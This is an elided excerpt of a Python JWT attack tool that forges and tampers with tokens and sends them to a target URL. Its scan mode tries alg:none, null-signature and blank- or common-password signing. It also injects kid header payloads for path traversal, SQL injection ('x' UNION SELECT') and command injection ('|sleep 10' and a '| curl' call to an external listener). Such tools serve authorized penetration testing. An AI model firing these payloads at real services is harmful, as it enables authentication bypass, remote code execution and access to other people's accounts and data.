...
def createConfig():
    ...
    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
                             'jwks_kid': 'jwt_tool'}
    if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (
    os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
    ...
    config['services'] = {'jwt_tool_version': jwttoolvers,
                          '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None,
                          'proxy': proxyHost + ':8080',
                          '# To disable following redirects set this value to: False (no quotes)': None,
                          'redir': 'True',
                          ...
                          '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None,
                          'httplistener': ''}
    ...
    cprintc("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.",
            "cyan")
    exit(1)
...
def sendToken(token, cookiedict, track, headertoken="", postdata=None):
    ...
    try:
        ...
        if config['services']['proxy'] == "False":
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False,
                                         verify=False, allow_redirects=redirBool)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False,
                                        allow_redirects=redirBool)
        else:
            proxies = {'http': 'http://' + config['services']['proxy'],
                       'https': 'http://' + config['services']['proxy']}
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies,
                                         verify=False, allow_redirects=redirBool)
            else:
...
def jwtOut(token, fromMod, desc=""):
    ...
    if config['argvals']['targetUrl'] != "":
        ...
        if cookietoken[1] == 1 or headertoken[1] == 1 or posttoken[1]:
            ...
            if config['argvals']['overridesub'] == "true":
                ...
                cprintc(
                    "[-] No substitution occurred - check that a token is included in a cookie/header in the request",
                    "red")
                # cprintc(headertoken, cookietoken, "cyan")
                exit(1)
        if config['argvals']['canaryvalue']:
            if config['argvals']['canaryvalue'] in str(resData[2]):
                cprintc("[+] FOUND \"" + config['argvals'][
                    'canaryvalue'] + "\" in response:\n" + logID + " " + fromMod + " Response Code: " + str(
                    resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            else:
                cprintc(
                    logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes",
                    "cyan")
        else:
    ...
    try:
        config['argvals']['rescode'], config['argvals']['ressize'], config['argvals']['rescontent'] = str(
            resData[0]), str(resData[1]), str(resData[2])
    except:
        pass
...
def checkPubKeyExploit(headDict, paylB64, pubKey):
    ...
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(), newTok.encode(), hashlib.sha256).digest()).decode(
        'UTF-8').strip("=")
...
def injectpayloadclaim(payloadclaim, injectionvalue):
    ...
    newPaylB64 = base64.urlsafe_b64encode(json.dumps(newpaylDict, separators=(",", ":")).encode()).decode(
        'UTF-8').strip("=")
...
def injectheaderclaim(headerclaim, injectionvalue):
    ...
    newHeadB64 = base64.urlsafe_b64encode(json.dumps(new_head_dict, separators=(",", ":")).encode()).decode(
        'UTF-8').strip("=")
    return new_head_dict, newHeadB64
    ...
    while True:
        ...
        if selection < len(paylList) and selection > 0:
            if isinstance(paylDict[paylList[selection]], dict):
                cprintc("\nPlease select a sub-field number for the " + str(
                    paylList[selection]) + " claim:\n(or 0 to Continue)", "white")
                newVal = OrderedDict()
...
def signingToken(new_head_dict, newpaylDict):
    if config['argvals']['sigType'][0:2] == "hs":
        ...
        newSig, newContents = signTokenHS(new_head_dict, newpaylDict, key, int(config['argvals']['sigType'][2:]))
        ...
        newSig, newContents = signTokenRSA(new_head_dict, newpaylDict, config['crypto']['privkey'],
                                           int(config['argvals']['sigType'][2:]))
        ...
        newSig, newContents = signTokenEC(new_head_dict, newpaylDict, config['crypto']['ecprivkey'],
                                          int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - EC Signing:"
        jwtOut(newContents + "." + newSig, "Manual Tamper - EC Signing", desc)
    elif config['argvals']['sigType'][0:2] == "ps":
        newSig, newContents = signTokenPSS(new_head_dict, newpaylDict, config['crypto']['privkey'],
                                           int(config['argvals']['sigType'][2:]))
...
def testKey(key, sig, contents, headDict, quiet):
    ...
    if testSig == sig:
        ...
        cprintc(
            "You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S " + str(
                headDict["alg"]).lower() + " -p \"" + key.decode('UTF-8') + "\"", "cyan")
        return cracked
    else:
        cracked = False
        if quiet == False:
...
def signTokenHS(headDict, paylDict, key, hashLength):
    ...
    if hashLength == 384:
        ...
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(), newContents.encode(), hashlib.sha384).digest()).decode(
            'UTF-8').strip("=")
    elif hashLength == 512:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(), newContents.encode(), hashlib.sha512).digest()).decode(
            'UTF-8').strip("=")
    else:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(), newContents.encode(), hashlib.sha256).digest()).decode(
            'UTF-8').strip("=")
...
def jwksEmbed(new_head_dict, newpaylDict):
    newHead = new_head_dict
...
def exportJWKS(jku):
    try:
        kid = headDict["kid"]
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku,
                                                                                config['crypto']['privkey'], kid)
    except:
        kid = ""
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku,
...
def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict, separators=(",", ":")).encode()).decode(
            'UTF-8').strip("=") + "."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict, separators=(",", ":")).encode()).decode(
            'UTF-8').strip("=") + "." + base64.urlsafe_b64encode(
            json.dumps(paylDict, separators=(",", ":")).encode()).decode('UTF-8').strip("=")
        ...
        if claim in ["exp", "nbf", "iat"]:
            ...
            if claim == "exp":
                if int(timestamp.timestamp()) < nowtime:
                    expiredtoken = True
            cprintc("[" + placeholder + "] " + claim + " = " + str(
                paylDict[claim]) + "    ==> TIMESTAMP = " + timestamp.strftime('%Y-%m-%d %H:%M:%S') + " (UTC)", "green")
            timeseen += 1
...
def validateToken(jwt):
    ...
    try:
        ...
        cprintc("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters",
                "red")
        cprintc("----------------", "white")
...
def injectOut(new_head_dict, newpaylDict):
    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
        ...
        signingToken(new_head_dict, newpaylDict)
    else:
        runActions()
...
def scanModePlaybook():
    ...
    # Persistent
    jwtOut(jwt, "Persistence check 1 (should always be valid)",
           "Original token sent to check if tokens work after invalid submissions")
    # Claim processing order - check reflected output in all claims
    reflectedClaims()
    jwtOut(jwt, "Persistence check 2 (should always be valid)",
           "Original token sent to check if tokens work after invalid submissions")
    # Weak HMAC secret
    ...
    jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)",
           "This token can exploit a hard-coded blank password in the config")
    # Exploit: null signature
    jwtNull = checkNullSig(contents)
    jwtOut(jwtNull, "Exploit: Null signature (-X n)",
           "This token was sent to check if a null signature can bypass checks")
    # Exploit: alg:none
    ...
    for noneTok in zippedToks:
        jwtOut(noneTok, "Exploit: " + zippedToks[noneTok] + " (-X a)",
    ...
    new_head_dict, newHeadB64 = injectheaderclaim("kid", "")
    key = open(path + "/null.txt").read()
    newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
    ...
    new_head_dict, newHeadB64 = injectheaderclaim("kid", "../../../../../../dev/null")
    key = open(path + "/null.txt").read()
    newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
    ...
    new_head_dict, newHeadB64 = injectheaderclaim("kid", "/invalid_path")
    key = open(path + "/null.txt").read()
    newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
    jwtOut(newContents + "." + newSig, "Injected kid claim - null-signed with kid=\"/invalid_path\"")
    # kid inject: RCE - sign with null
    new_head_dict, newHeadB64 = injectheaderclaim("kid", "|sleep 10")
    key = open(path + "/null.txt").read()
    newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
    ...
    if config['services']['httplistener']:
        ...
        new_head_dict, newHeadB64 = injectheaderclaim("kid", "| curl " + injectUrl)
        key = open(path + "/null.txt").read()
        newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
        jwtOut(newContents + "." + newSig,
               "Injected kid claim - RCE attempt - curl " + injectUrl + " (did this URL get accessed?)")
    # kid inject: SQLi explicit value
    new_head_dict, newHeadB64 = injectheaderclaim("kid", "x' UNION SELECT '1';--")
    key = "1"
    newSig, newContents = signTokenHS(new_head_dict, paylDict, key, 256)
    ...
    if config['services']['httplistener']:
        ...
        cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option",
                "red")
    ...
    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
        ...
        while commonPass:
            ...
            jwtOut(newContents + "." + newSig,
                   "Checking for alternative accepted HMAC signatures, based on common passwords. Testing: " + commonPass + "",
                   "This token can exploit a hard-coded common password in the config")
            commonPass = commonPassList.readline().rstrip()
    # SCAN COMPLETE
    ...
    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
        cprintc("[+] Try testing " + headDict['alg'][
                                     :2] + " token against weak password configurations by running the following hashcat cracking options:",
                "green")
    ...
    try:
        ...
        cprintc("[+] Try waiting for the token to expire (\"exp\" value set to: " + timestamp.strftime(
            '%Y-%m-%d %H:%M:%S') + " (UTC))", "green")
...
def injectCommonClaims(contentVal):
    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
        ...
        while nextHeader:
            ...
            jwtOut(newContents + "." + sig,
                   "Injected " + str(contentVal) + " into Common Header Claim: " + str(nextHeader))
            if origVal != "":
    ...
    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
        ...
        while nextPayload:
            ...
            newContents = genContents(headDict, paylDict)
            jwtOut(newContents + "." + sig,
                   "Injected " + str(contentVal) + " into Common Payload Claim: " + str(nextPayload))
            if origVal != "":
...
#         while nextVal:
#             new_head_dict, newHeadB64 = injectheaderclaim(config['argvals']['headerclaim'], nextVal.rstrip())
#             newContents = genContents(new_head_dict, paylDict)
...
def reflectedClaims():
    ...
    for claim in paylDict:
        ...
        tmpContents = base64.urlsafe_b64encode(json.dumps(headDict, separators=(",", ":")).encode()).decode(
            'UTF-8').strip("=") + "." + base64.urlsafe_b64encode(
            json.dumps(paylDict, separators=(",", ":")).encode()).decode('UTF-8').strip("=")
        jwtOut(tmpContents + "." + sig, "Claim processing check in " + claim + " claim",
               "Token sent to check if the signature is checked before the " + claim + " claim is processed")
...
def preScan():
    ...
    if config['argvals']['canaryvalue']:
        if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:
            cprintc("Canary value (" + config['argvals'][
                'canaryvalue'] + ") was not found in base request - check that this token is valid and you are still logged in",
                    "red")
    ...
    if origResCode != config['argvals']['rescode']:
        cprintc(
            "Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission",
            "red")
        exit(1)
...
def runExploits():
    if args.exploit:
        if args.exploit == "a":
            ...
            for noneTok in zippedToks:
                desc = "EXPLOIT: " + zippedToks[
                    noneTok] + " - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
            ...
            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:
                cprintc(
                    "Paste this JWKS into a file at the following location before submitting token request: " + jku + "\n(JWKS file used: " +
...
def printLogo():
    print()
    print(
        "   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\                  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ ")
    print(
        "   \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __| \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __|                 \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        "      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        "      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        "\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  _\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        "\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  / \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        "\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  /   \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(
        " \______/ \__/     \__|   \__|\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\__| \______/  \______/ \__|")
    print(
        " \x1b[36mVersion " + jwttoolvers + "          \x1b[0m      \______|             \x1b[36m@ticarpi\x1b[0m      ")
    print()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po",
    ...
    if config['services']['jwt_tool_version'] != jwttoolvers:
        cprintc(
            "Config file showing wrong version (" + config['services']['jwt_tool_version'] + " vs " + jwttoolvers + ")",
            "red")
        cprintc("Current config file has been backed up as '" + path + "/old_(" + config['services'][
            'jwt_tool_version'] + ")_jwtconf.ini' and a new config generated.\nPlease review and manually transfer any custom options you have set.",
                "red")
    ...
    if args.targeturl:
        if args.cookies or args.headers or args.postdata:
            ...
            if args.cookies and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*',
                                          args.cookies):
                jwt_count += 1
                jwt_locations.append("cookie")

            if args.headers and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*',
                                          str(args.headers)):
                jwt_count += 1
                jwt_locations.append("headers")

            if args.postdata and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*',
                                           str(args.postdata)):
                jwt_count += 1
    ...
    if args.sign:
        if args.sign not in ['hs256', 'hs384', 'hs512', 'rs256', 'rs384', 'rs512', 'es256', 'es384', 'es512', 'ps256',
                             'ps384', 'ps512']:
            parser.print_usage()
        ...
        if args.headerclaim:
            for headerclaim, headervalue in zip(args.headerclaim, args.headervalue):
                if os.path.isfile(headervalue):
                    ...
                    new_head_dict, newHeadB64 = injectheaderclaim(headerclaim, headervalue)
                    newContents = genContents(new_head_dict, paylDict)
                    headDict, paylDict, sig, contents = validateToken(newContents + "." + sig)
        if injectionfile:
            if args.mode:
            ...
            with open(injectionfile[2], "r", encoding='utf-8', errors='ignore') as valLst:
                ...
                while nextVal:
                    if injectionfile[0] == "payload":
                        ...
                        new_head_dict, newHeadB64 = injectheaderclaim(injectionfile[1], nextVal.rstrip())
                        newContents = genContents(new_head_dict, paylDict)
                        headDict, paylDict, sig, contents = validateToken(newContents + "." + sig)
                    injectOut(new_head_dict, newpaylDict)
                    nextVal = valLst.readline()
            exit(1)
        else:
            if not args.mode:
